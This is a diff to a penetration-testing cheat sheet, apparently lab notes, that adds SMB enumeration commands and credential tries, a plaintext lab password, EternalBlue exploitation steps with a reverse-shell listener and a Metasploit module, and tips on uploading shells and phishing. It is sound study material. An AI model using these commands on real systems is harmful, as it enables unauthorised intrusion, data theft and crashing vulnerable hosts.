@@ -1356,6 +1356,27 @@ net
 net view \\<IP> /All                                                  see which shares are available
 net use \\<IP>\<share>                                                connect to the SMB share
 copy \\<IP>\<share>\<file>                                            get files
+
+more enumeration
+----------------
+sudo nmap -vvv -p 137 -sU --script=nbstat.nse 192.168.190.140
+nmap -vvv -p 139,445 --script=smb* 192.168.228.63
+crackmapexec smb 192.168.157.31 -u 'guest' -p ''
+crackmapexec smb 192.168.228.63 -u '' -p '' --shares
+- see anon logins
+- use flags --shares and --rid-brute
+smbclient \\\\\192.168.228.63\\
+smbclient -U 'Guest' -L \\\\\192.168.134.126\\
+smbclient --no-pass -L //192.168.203.172
+enum4linux -a -u "CRAFT2\\thecybergeek" -p "winniethepooh" 192.168.203.188
+```
+
+**Connect to a share**
+```
+smbclient //192.168.134.126/print$
+smbclient \\\\\192.168.212.172\\Shenzi
+smbclient //192.168.203.172/DocumentsShare -U CRAFT2/thecybergeek
+mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' /mnt
 ```
 
 **Use nmap to scan for the NetBIOS service**<br/>
@@ -1368,13 +1389,32 @@ copy \\<IP>\<share>\<file>                                            get files
 `ls -1 /usr/share/nmap/scripts/smb*`<br/>
 Example: `nmap -v -p 139, 445 --script=smb-os-discovery <IP>`
 
-**Determining whether a host is vulnerable to the MS08_067 vulnerability**<br/>
-`nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <IP>`<br/>
-Note: the script parameter `unsafe=1`, the scripts that will run are almost guaranteed to crash a vulnerable system
+**Determining whether a host is vulnerable to the MS08_067 vulnerability**
+- `nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <IP>`
+  - Note: the script parameter `unsafe=1`, the scripts that will run are almost guaranteed to crash a vulnerable system
+
+**EternalBlue**
+- https://redteamzone.com/EternalBlue/
+- `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 192.168.1.17`
+- `sudo impacket-smbserver -smb2support share /home/kali/Documents/windows-attack/nc/`
+First option
+- `python 42315 10.10.10.4`
+  - exploit: https://www.exploit-db.com/exploits/42315
+Second option
+- With AutoBlue-MS17-010
+  1. `cd shellcode` > `./shell_prep.sh`
+  2. run a listener
+  3. `python eternalblue_exploit7.py 10.10.14.10 shellcode/sc_x64.bin`
+Third option
+- with metasploit
+  - `use windows/smb/ms17_010_psexec`
 
 **General notes**
 - Remember that you can transfer files to the share with `copy <file> \\<IP>\share`
   - Also when using `sudo impacket-smbserver -smb2support share .`
+- check if this smb hosts files of the web service, it might be possible to upload a shell
+- maybe it's possible to do phishing
+- nmap -Pn -p 139,445 --open --max-hostgroup 3 --script=smb-vuln* 10.10.10.4
 
 ### <ins>NFS Enumeration</ins>
 
